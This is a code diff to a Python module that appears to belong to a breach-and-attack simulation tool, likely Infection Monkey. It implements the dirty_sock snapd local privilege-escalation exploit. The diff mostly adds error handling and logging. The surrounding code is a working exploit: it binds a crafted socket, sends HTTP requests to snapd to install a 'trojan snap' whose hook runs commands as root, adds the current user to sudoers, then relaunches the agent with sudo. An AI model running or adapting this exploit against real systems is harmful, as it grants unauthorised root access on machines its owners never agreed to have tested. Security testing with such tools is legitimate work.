@@ -62,12 +62,22 @@ def bind_sock(sockfile):
     socket's ancillary data.
     """
     LOG.info("Binding to socket file...")
-    client_sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
-    client_sock.bind(sockfile)
+    try:
+        client_sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+        client_sock.bind(sockfile)
+    except socket.error as e:
+        LOG.error('Failed to bind to the socket')
+        return False
 
     # Connect to the snap daemon
     LOG.info("Connecting to snapd API...")
-    client_sock.connect('/run/snapd.socket')
+
+    try:
+        client_sock.connect('/run/snapd.socket')
+    except socket.error as e:
+        LOG.error('Failed to connect to snapd.socket! The service snapd is not running')
+        return False
+
 
     return client_sock
 
@@ -85,7 +95,7 @@ def delete_snap(client_sock):
                 + post_payload)
 
     # Send our payload to the snap API
-    print("[+] Deleting trojan snap (and sleeping 5 seconds)...")
+    LOG.info("[+] Deleting trojan snap (and sleeping 5 seconds)...")
     client_sock.sendall(http_req.encode("utf-8"))
 
     # Receive the data and extract the JSON
@@ -93,15 +103,15 @@ def delete_snap(client_sock):
 
     # Exit on probably-not-vulnerable
     if '"status":"Unauthorized"' in http_reply:
-        print("[!] System may not be vulnerable, here is the API reply:\n\n")
-        print(http_reply)
-        sys.exit()
+        LOG.info("[!] System may not be vulnerable, here is the API reply:\n\n")
+        # LOG.info(http_reply) debug output
+        return False
 
     # Exit on failure
     if 'status-code":202' not in http_reply:
-        print("[!] Did not work, here is the API reply:\n\n")
-        print(http_reply)
-        sys.exit()
+        LOG.info("[!] Did not work, here is the API reply:\n\n")
+        # LOG.info(http_reply) debug output
+        return False
 
     # We sleep to allow the API command to complete, otherwise the install
     # may fail.
@@ -142,16 +152,16 @@ Content-Type: application/octet-stream
                  'Content-Length: ' + str(len(post_payload)) + '\r\n\r\n')
 
     # Send the headers to the snap API
-    print("[+] Installing the trojan snap (and sleeping 8 seconds)...")
+    LOG.info("[+] Installing the trojan snap (and sleeping 8 seconds)...")
     client_sock.sendall(http_req1.encode("utf-8"))
 
     # Receive the initial HTTP/1.1 100 Continue reply
     http_reply = client_sock.recv(8192).decode("utf-8")
 
     if 'HTTP/1.1 100 Continue' not in http_reply:
-        print("[!] Error starting POST conversation, here is the reply:\n\n")
-        print(http_reply)
-        sys.exit()
+        LOG.info("[!] Error starting POST conversation, here is the reply:\n")
+        # LOG.info(http_reply) debug output
+        return False
 
     # Now we can send the payload
     http_req2 = post_payload
@@ -162,9 +172,9 @@ Content-Type: application/octet-stream
 
     # Exit on failure
     if 'status-code":202' not in http_reply:
-        print("[!] Did not work, here is the API reply:\n\n")
-        print(http_reply)
-        sys.exit()
+        LOG.info("[!] Did not work, here is the API reply:\n\n")
+        # LOG.info(http_reply) debug output
+        return False
 
     # Sleep to allow time for the snap to install correctly. Otherwise,
     # The uninstall that follows will fail, leaving unnecessary traces
@@ -185,17 +195,22 @@ def runCommandAsRoot(command):
 
     # Bind the dirty socket to the snapdapi
     client_sock = bind_sock(sockfile)
+    if not client_sock:
+        return False
 
     # Delete trojan snap, in case there was a previous install attempt
-    delete_snap(client_sock)
+    if not delete_snap(client_sock):
+        return False
 
     # Install the trojan snap, which has an install hook that creates a user
     install_snap(client_sock, TROJAN_SNAP)
 
     # Delete the trojan snap
-    delete_snap(client_sock)
+    if not delete_snap(client_sock):
+        return False
 
     LOG.info("Command Executed Successfully \n")
+    return True
 
 
 class snapdExploiter(HostPrivExploiter):
@@ -207,19 +222,28 @@ class snapdExploiter(HostPrivExploiter):
         whoami = os.popen('whoami').read()[:-1]
         LOG.info("Adding the current user %s to the sudoers list",whoami)
 
+        # we create a temp file in /tmp as root to verify command exec as root
+        alphabet = string.ascii_lowercase
+        filename = ''.join(random.choice(alphabet) for _ in range(10))
+        operation = 'touch /tmp/'
         # add the user to the sudo group
-        runMonkeyAsRoot = ADDUSER_TO_SUDOERS % {'user_name' : whoami}
-        # runCommandAsRoot(runMonkeyAsRoot)
+        AddUserAsSudoers = ADDUSER_TO_SUDOERS % {'user_name' : whoami}
+        command = AddUserAsSudoers + " && " + operation + filename
 
-        # check if exploit is successful
-
-        if not check_if_sudoer():
+        if runCommandAsRoot(command):
+            # check if exploit is successful
+            file_path = "/tmp/%(filename)s"
+            if not check_if_sudoer(file_path %{'filename':filename}):
+                LOG.info("Either file doesn't exist or is not owned by root!")
+                return False
+        else:
+            LOG.info("Snapd Privilege escalation was not successful!")
             return False
 
+        LOG.info("The command that is executed as root is %s" % command)
         # now run the monkey as root
 
-        LOG.info("Running the monkey as root ")
-        command = "sudo "+ command
+        command = "sudo " + command
         monkey_process = subprocess.Popen(command, shell=True,
                                           stdin=None, stdout=None, stderr=None,
                                           close_fds=True, creationflags=0)
